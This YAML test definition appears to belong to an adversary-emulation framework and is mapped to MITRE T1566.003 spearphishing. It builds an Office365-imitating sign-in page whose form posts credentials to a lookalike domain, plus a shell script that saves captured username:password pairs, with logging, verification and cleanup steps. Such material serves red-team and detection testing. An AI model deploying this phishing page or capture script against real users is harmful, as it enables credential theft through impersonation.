---
api_version: 2.0
uuid: 8c3d1e5f-2b9a-4c7d-6f8e-3a1b5c9d2e4f
name: Credential Harvesting Form Setup
authors:
  - mbhatt
description: |
  Demonstrates credential harvesting form setup by creating a fake login form
  that mimics a legitimate company portal. Simulates HTML form creation and
  credential capture mechanisms.

mitre:
  tactics:
    - "TA0001 Initial Access"
  techniques:
    - "T1566 Phishing"
  subtechniques:
    - "T1566.003 Phishing: Spearphishing via Service"

requirements:
  platforms:
    - os: darwin

args:
  - name: target_service
    description: "Service being impersonated (e.g., Office365, Gmail)"
    type: string
    default: "Office365"
  - name: form_domain
    description: "Domain hosting the fake form"
    type: string
    default: "secure-verify-office365.com"
  - name: harvest_endpoint
    description: "Endpoint URL for credential submission"
    type: string
    default: "https://secure-verify-office365.com/auth/verify"

steps:
  - name: create_credential_harvesting_form
    description: Create credential harvesting HTML form
    inline: |
      mkdir -p /tmp/phishing_forms
      cat > /tmp/phishing_forms/login.html << 'HTMLEOF'
      <!DOCTYPE html>
      <html>
      <head><title>{{ target_service }} - Sign In</title></head>
      <body>
        <div class="login-container">
          <h2>{{ target_service }} Sign In</h2>
          <form action="{{ harvest_endpoint }}" method="POST">
            <input type="email" name="username" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
          </form>
        </div>
      </body>
      </html>
      HTMLEOF
      echo "Created credential harvesting form"
    cleanup:
      inline: |
        rm -rf /tmp/phishing_forms
        rm -rf /tmp/harvested_credentials

  - name: create_form_submission_handler
    description: Create form submission handler script
    inline: |
      cat > /tmp/phishing_forms/capture_credentials.sh << 'SCRIPTEOF'
      #!/bin/bash
      username=$1
      password=$2
      timestamp=$(date +%Y%m%d_%H%M%S)
      mkdir -p /tmp/harvested_credentials
      echo "$username:$password" >> /tmp/harvested_credentials/captured_${timestamp}.txt
      SCRIPTEOF
      chmod +x /tmp/phishing_forms/capture_credentials.sh
      echo "Created form submission handler"

  - name: log_form_setup
    description: Log form setup details
    inline: |
      mkdir -p /tmp/harvest_logs
      timestamp=$(date +%Y%m%d_%H%M%S)
      cat > /tmp/harvest_logs/form_setup_${timestamp}.log << 'LOGEOF'
      Credential Harvesting Form Created
      Target Service: {{ target_service }}
      Form Domain: {{ form_domain }}
      Submission Endpoint: {{ harvest_endpoint }}
      LOGEOF
      echo "Form setup logged"
    cleanup:
      inline: |
        rm -rf /tmp/harvest_logs

  - name: verify_html_form_created
    description: Verify HTML form was created
    inline: |
      test -f /tmp/phishing_forms/login.html && echo "PASS: Login form created"

  - name: verify_form_contains_target_service
    description: Verify form contains target service name
    inline: |
      grep -q "{{ target_service }}" /tmp/phishing_forms/login.html && echo "PASS: Form impersonates target service"

  - name: verify_submission_endpoint_configured
    description: Verify submission endpoint is configured
    inline: |
      grep -q "{{ harvest_endpoint }}" /tmp/phishing_forms/login.html && echo "PASS: Submission endpoint configured"

tests:
  - name: credential_harvesting_form_test
    dry_run: true
